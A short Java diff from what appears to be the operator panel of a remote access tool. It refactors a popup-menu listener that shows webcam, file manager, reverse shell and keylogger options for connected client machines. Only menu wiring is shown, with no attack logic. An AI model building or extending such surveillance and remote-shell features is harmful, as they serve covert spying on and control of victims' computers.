@@ -136,7 +136,7 @@ public class TablePopUpListener extends MouseAdapter {
         // set actions
         webcamMenu.addActionListener(new WebcamMenuListener());
         fileManagerMenu.addActionListener(new FileManagerMenuListener(mainGUI));
-        reverseShellMenu.addActionListener(new ReverseShellMenuListener());
+        reverseShellMenu.addActionListener(new ReverseShellMenuListener(mainGUI));
         keyloggerMenuOptions.addMenuListener(new KeyLoggerMenuListener(new JMenuItem[]{startKeyloggerMenu, stopKeyloggerMenu}));
         startKeyloggerMenu.addActionListener(new KeyLoggerEventsListener(KeyloggerEvents.START));
         stopKeyloggerMenu.addActionListener(new KeyLoggerEventsListener(KeyloggerEvents.STOP));
@@ -165,7 +165,7 @@ public class TablePopUpListener extends MouseAdapter {
             if (!source.isRowSelected(row)) source.changeSelection(row, column, false, false);
             if (mainGUI.getConnectionsDefaultTableModel().getValueAt(row, 5).equals("Connected")) {
                 connectedPopUpMenu.show(e.getComponent(), e.getX(), e.getY());
-                Streams stream = GetSYS.getClientHandler().getMainStream();
+                ClientHandler stream = GetSYS.getClientHandler();
                 assert stream != null;
                 webcamMenu.setVisible(stream.getTempSystemInformation().WEBCAM());
                 keyloggerMenuOptions.setVisible(stream.getTempSystemInformation().KEYLOGGER());
